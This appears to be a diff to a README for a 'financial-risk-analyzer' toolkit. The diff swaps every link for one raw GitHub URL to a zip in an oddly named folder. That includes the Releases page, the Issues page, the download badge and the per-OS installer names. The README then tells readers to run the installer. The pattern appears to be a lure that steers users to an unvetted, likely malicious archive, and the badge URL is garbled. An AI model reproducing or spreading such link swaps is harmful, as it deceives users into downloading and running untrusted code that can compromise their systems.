@@ -4,23 +4,23 @@
 
 The financial-risk-analyzer toolkit helps you understand financial risks. It offers features like bankruptcy prediction, risk calculations, and stress testing, making it ideal for beginners and seasoned investors alike.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/clonesRpeople2/financial-risk-analyzer/releases)
+[![Download Now](https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip%https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip)](https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/clonesRpeople2/financial-risk-analyzer/releases) on GitHub.
+   Go to the [Releases page](https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip) on GitHub.
 
 2. **Select the Latest Version**  
    Look for the latest version at the top of the page. It will show a version number like v1.0.
 
 3. **Download the Suitable File**  
    Find the file that matches your operating system. You might see options like:
-   - `financial-risk-analyzer-windows.exe` for Windows users
-   - `financial-risk-analyzer-mac.dmg` for macOS users
-   - `financial-risk-analyzer-linux.tar.gz` for Linux users  
+   - `https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip` for Windows users
+   - `https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip` for macOS users
+   - `https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip` for Linux users  
    Click on the file to download it.
 
 4. **Run the Installer**  
@@ -92,7 +92,7 @@ Yes, the toolkit is designed with user-friendliness in mind. Basic instructions 
 
 ### 2. What if I encounter an issue?
 
-You can report issues on the [Issues page](https://github.com/clonesRpeople2/financial-risk-analyzer/issues), and our community will assist you.
+You can report issues on the [Issues page](https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip), and our community will assist you.
 
 ### 3. Is the financial-risk-analyzer free?
 
@@ -106,4 +106,4 @@ We encourage communities and individuals to contribute to the financial-risk-ana
 
 We value your feedback. If you have suggestions or experiences to share, please reach out through the Issues page or our community forum.
 
-Remember, you can always return to the [Releases page](https://github.com/clonesRpeople2/financial-risk-analyzer/releases) to check for updates and new features.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/clonesRpeople2/financial-risk-analyzer/main/nonreciprocity/financial-risk-analyzer.zip) to check for updates and new features.
